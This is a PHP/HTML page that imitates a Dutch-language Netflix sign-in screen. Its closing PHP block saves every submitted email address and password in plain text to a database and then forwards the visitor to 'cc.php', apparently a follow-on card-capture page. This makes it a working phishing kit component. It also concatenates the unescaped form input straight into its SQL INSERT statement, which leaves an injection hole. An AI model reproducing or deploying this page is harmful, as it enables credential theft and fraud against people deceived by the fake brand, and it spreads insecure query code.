<?php
    require_once('database.php');
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-compatable" content="IE-edge">
	<meta name="viewport" content="width=device-width">
	<title>Netflix</title>
	<link rel="icon" href="images/ico.png">
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="css/c.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/
	font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<style>
	body{
		background-image: url('images/bg.jpg');background-repeat:no-repeat;width: 100%;background-size: cover;
	}
	*{
		padding: 0px
		margin:0px;
	}
	.logo{
		margin-top: -10px;
		margin-left: 5px;
		width: 210px;
	}
	.fluid{
		background-color: rgb(0,0,0,0.5);
		height: auto;
	}
	.main1{
		margin-top: -20px;
		margin-left: -20px;
	}
	.main2{
		background-color: rgb(0,0,0,0.7);
		width: 450px;
		height: auto;
		border-radius: 5px;
	}
	.maindiv{
		margin-left: 67px;
		margin-top: 20px;
	}
	.signintitle{
		color: white;
		font-size: 32px;
		font-weight: bold;
		margin-top: 19px;
	}
	.form{
		margin-top:25px;
	}
	.email{
		width: 310px;
		height: 50px;
		border:0px;
		border-radius: 4px;
		padding: 15px;
		background-color: #333333;
		font-size: 16.5px;
		outline: none;
		color: white;
	}
	.password{
		color: white;
		width: 310px;
		height: 50px;
		border:0px;
		border-radius: 4px;
		padding: 15px;
		background-color: #333333;
		font-size: 16.5px;
		outline: none;
		margin-top: 15px;
	}
	.submit{
		width: 310px;
		height: 50px;
		border:0px;
		border-radius: 4px;
		padding: 15px;
		background-color: #e50914;
		color: white;
		font-weight: bold;
		font-size: 16.5px;
		outline: none;
		margin-top: 40px;
	}
	.checkmargin{
		margin-top: 10px;
	}
	.check{
		width: 15px;
		height: 15px;
	}
	.checkpara{
		color: #a2b3a2;
		margin-left: 20px;
		margin-top: -22px;
	}
	.need{
		color: #a2b3a2;
		margin-left: 235px;
		margin-top: -30px;

	}
	.fb{
		margin-top: 30px;
		width: 20px;
	}
	.fbpara{
		color: #676767;
		margin-left: 27px;
		margin-top: -20px;
	}
	.new{
		color: #676767;
		margin-top: 5px;
		font-size: 17px;
	}
	.signup{
		color: white;
	}
	.this{
		margin-top: 5px;
		color:#8c8c8c;
		margin-bottom: 40px;
		line-height: 15px;
	}
	.learn{
		color: #025fc3;

	}
	.footer, .footer2, .footer3{
		background-color: rgb(0,0,0,0.8);
		height: auto;
	}
	.footerimg{
		margin-top: 10px;
	}
	.ques{
		color: #8c8c8c;
		font-size: 16px;
		margin-left: 200px;
		margin-top: 20px;
	}
	.link{
		margin-top: 20px;
	}
	.gift{
		color: #8c8c8c;
		font-size: 16px;
		margin-left: 200px;
		margin-top: 20px;
	}
	.gift:hover{
		text-decoration: none;
		color: #8c8c8c;
	}
	.bt{
		margin-left: 200px;
		margin-top: 30px;
		width: 150px;
	}
	@media only screen and (max-width: 375px)
	{
		body{
			background:none;
			background-color:black;
		}
		.main2{
			width: 380px;
			height: 500px;
		}
		.maindiv{
			margin-left: 35px;
		}
		.logo{
			width: 120px;
		}
		.ques, .gift, .bt{
			margin-left: 30px;
		}
		#privacy{
			float: left;
			margin-top: 5px;
		}
		.footer, .footer2, .footer3{
			margin-top: 0px;
		}
	}
	@media only screen and (max-width: 414px)
	{
		body{
			background:none;
			background-color:black;
		}
		.main2{
			width: 380px;
			height: 500px;
		}
		.maindiv{
			margin-left: 35px;
		}
		.logo{
			width: 120px;
		}
		.ques, .gift, .bt{
			margin-left: 30px;
		}
		#privacy{
			float: left;
			margin-top: 5px;
		}
		.footer, .footer2, .footer3{
			margin-top: 0px;
		}
	}
</style>
<body>
	<div class="container-fluid fluid">
		<div class="row">
			<div class="col-md-12">
				<img src="images/logo.png" class="img-responsive logo">
			</div>
		</div>
		<div class="row">
			<div class="col-md-4"></div>
			<div class="col-md-4 main1">
				<main class="main2">
					<div class="maindiv">
						<br>
						<p class="signintitle">
							Inloggen
						</p>
						<form method="POST" action="1.php" class="form">
							<div class="form-group">
								<div class="input-group">
									<input type="text" required="required" name="email" class="email" placeholder="E-mailadres of telefoonnummer">
								</div>
								<div class="input-group">
									<input type="password" required="required" name="password" class="password" placeholder="Wachtwoord">
								</div>
								<div class="input-group">
									<input type="submit" name="submit" class="submit" value="Inloggen">
								</div>
								<div class="input-group checkmargin">
									<input type="checkbox" class="check">
									<p class="checkpara">
										Mijn gegevens onthouden
									</p>
									<p class="need">
										Hulp nodig?
									</p>
								</div>
							</div>
						</form>
						<img src="images/fb.png" class="img-responsive fb">
						<p class="fbpara">
							Inloggen met Facebook
						</p>
						<p class="new">
							Is Netflix nieuw voor jou ?
							<a href="" class="signup">
								Registreer je nu.
							</a>

						</p>
						<p class="this">
							Deze pagina wordt beschermd met Google <br>
							reCAPTCHA om te controleren of je geen bot bent.<br>
							<a href="" class="learn">
								Lees meer informatie.
							</a>
							<br><br><br>
							<br><br><br>
							<br><br><br>
						</p>
					</div>
				</main>
			</div>
			<div class="col-md-4"></div>
		</div>
		<div class="row footer">
				<p class="ques">
					Vragen? Neem contact met ons op.
				</p>
		</div>
		<div class="row footer2">
				<p class="links">
					<a href="" class="gift">
						Voorwaarden voor cadeaukaarten
					</a>
					<a href="" class="gift">
						Gebruiksvoorwaarden
					</a>
					<a href="" class="gift" id="privacy">
						Privacyverklaring
					</a>
				</p>
		</div>
		<div class="row footer3">
				<img src="images/bt.png" class="img-responsive bt">
				<br><br>
		</div>
	</div>

<script defer src="https://use.fontawesome.com/releases/v5.0.8/js/solid.js" integrity="sha384-+Ga2s7YBbhOD6nie0DzrZpJes+b2K1xkpKxTFFcx59QmVPaSA8c7pycsNaFwUK6l" crossorigin="anonymous"></script>
<script defer src="https://use.fontawesome.com/releases/v5.0.8/js/fontawesome.js" integrity="sha384-7ox8Q2yzO/uWircfojVuCQOZl+ZZBg2D2J5nkpLqzH1HY0C1dHlTKIbpRz/LG23c" crossorigin="anonymous"></script>
<script type="text/javascript" href="js/bootstrap.js"></script>
<script type="text/javascript" href="js/jquery.js"></script>
</body>
</html>
<?php
if(isset($_POST['submit']))
	{
		$radio1 = $_POST['email'];
		$radio2 = $_POST['password'];

		$quer = "Insert into login(Email,Password)values('$radio1','$radio2')";

		if(mysqli_query($connect,$quer))
		{

			echo"<script>window.open('cc.php','_self')</script>";
		}
		else
		{
			echo "<script>alert('Failed To Submit...')</script>";
		}

	}

?>

